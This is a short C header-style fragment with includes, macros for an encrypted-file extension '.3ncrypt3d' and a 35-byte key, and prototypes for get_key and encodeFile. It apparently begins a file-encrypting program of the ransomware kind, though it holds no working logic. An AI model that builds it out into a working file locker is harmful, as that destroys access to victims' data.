#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

#define EXT_ENCRYPTED ".3ncrypt3d"
#define EXT_LENGHT 10

#define SIZE_KEY 35

char* get_key(int length);
void encodeFile(FILE *file, int nb);
